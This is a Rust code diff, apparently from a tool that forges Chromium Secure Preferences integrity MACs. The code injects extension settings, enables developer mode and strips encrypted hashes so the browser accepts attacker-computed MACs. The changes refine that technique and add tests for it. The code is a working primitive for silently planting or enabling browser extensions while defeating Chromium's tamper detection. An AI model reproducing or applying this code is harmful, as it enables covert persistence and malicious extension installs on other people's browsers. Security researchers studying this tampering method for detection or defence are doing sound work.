@@ -72,7 +72,8 @@ pub struct ExtInfo {
     pub path: String,
     /// The manifest `version` field, or empty if absent.
     pub version: String,
-    /// `true` if `state == 1` (enabled).
+    /// `true` when current `disable_reasons` is empty or absent, with legacy
+    /// `state` honored when present in older records.
     pub enabled: bool,
 }
 
@@ -90,21 +91,16 @@ pub struct ExtInfo {
 pub fn add_extension(
     prefs_json: &mut Value,
     ext_id: &str,
-    mut settings: Value,
+    settings: Value,
     seed: &[u8],
     device_id: &str,
 ) -> Result<String, SecPrefError> {
     require_object(prefs_json, "$")?;
 
-    // Chromium's HMAC input is the settings blob AFTER stripping empties, so
-    // strip before MAC-ing and before writing.
-    mac::strip_empties(&mut settings);
-
-    ensure_object(prefs_json, &["extensions", "settings"])
-        .insert(ext_id.to_string(), settings.clone());
-
     let path = format!("extensions.settings.{ext_id}");
     let ext_mac = mac::compute_mac(seed, device_id, &path, &settings);
+
+    ensure_object(prefs_json, &["extensions", "settings"]).insert(ext_id.to_string(), settings);
 
     ensure_object(
         prefs_json,
@@ -185,11 +181,9 @@ pub fn enable_developer_mode(prefs_json: &mut Value, seed: &[u8], device_id: &st
 
 /// Recursively remove every key that contains `"_encrypted_hash"`.
 ///
-/// Triggers Chromium's self-healing fallback: on next startup, Chromium
-/// regenerates the encrypted hashes from the (now attacker-computed) MACs
-/// rather than rejecting them. This is the crucial primitive of the whole
-/// technique — without it Chromium would notice the mismatched
-/// `settings_encrypted_hash` sub-tree and reset the extension.
+/// This can request Chromium's legacy-HMAC healing path on builds where that
+/// fallback remains enabled. It is not sufficient to prove that a browser will
+/// trust or retain the modified preference.
 pub fn strip_encrypted_hashes(value: &mut Value) {
     match value {
         Value::Object(map) => {
@@ -365,14 +359,24 @@ pub fn list_extensions(prefs_json: &Value) -> Vec<ExtInfo> {
                 .unwrap_or("")
                 .to_string();
 
-            let state = ext.get("state").and_then(Value::as_i64).unwrap_or(0);
+            let enabled = ext
+                .get("disable_reasons")
+                .and_then(Value::as_array)
+                .map_or_else(
+                    || {
+                        ext.get("state")
+                            .and_then(Value::as_i64)
+                            .is_none_or(|state| state == 1)
+                    },
+                    Vec::is_empty,
+                );
 
             ExtInfo {
                 id: id.clone(),
                 name,
                 path,
                 version,
-                enabled: state == 1,
+                enabled,
             }
         })
         .collect()
@@ -431,6 +435,24 @@ mod tests {
             .and_then(|e| e.get("settings"))
             .and_then(|s| s.get(ext_id))
             .is_some());
+    }
+
+    #[test]
+    fn add_extension_preserves_stored_empty_values() {
+        let mut prefs = json!({});
+        let ext_id = "abcdefghijklmnopqrstuvwxyzabcdef";
+        let settings = json!({
+            "empty_dict": {},
+            "empty_list": [],
+            "empty_string": "",
+            "null_value": null
+        });
+
+        add_extension(&mut prefs, ext_id, settings.clone(), &[0u8; 64], "sid").unwrap();
+
+        assert_eq!(prefs["extensions"]["settings"][ext_id], settings);
+        let verdict = verify_extension(&prefs, ext_id, &[0u8; 64], "sid");
+        assert!(verdict.is_ok());
     }
 
     #[test]
@@ -567,5 +589,39 @@ mod tests {
         assert_eq!(info.path, "/opt/ext");
         assert_eq!(info.version, "1.2.3");
         assert!(info.enabled);
+    }
+
+    #[test]
+    fn list_extensions_prefers_current_disable_reasons_over_legacy_state() {
+        let prefs = json!({
+            "extensions": {"settings": {
+                "enabled": {"disable_reasons": [], "state": 0},
+                "disabled": {"disable_reasons": [1], "state": 1},
+                "current_without_reasons": {}
+            }}
+        });
+
+        let listed = list_extensions(&prefs);
+        assert!(
+            listed
+                .iter()
+                .find(|ext| ext.id == "enabled")
+                .unwrap()
+                .enabled
+        );
+        assert!(
+            !listed
+                .iter()
+                .find(|ext| ext.id == "disabled")
+                .unwrap()
+                .enabled
+        );
+        assert!(
+            listed
+                .iter()
+                .find(|ext| ext.id == "current_without_reasons")
+                .unwrap()
+                .enabled
+        );
     }
 }
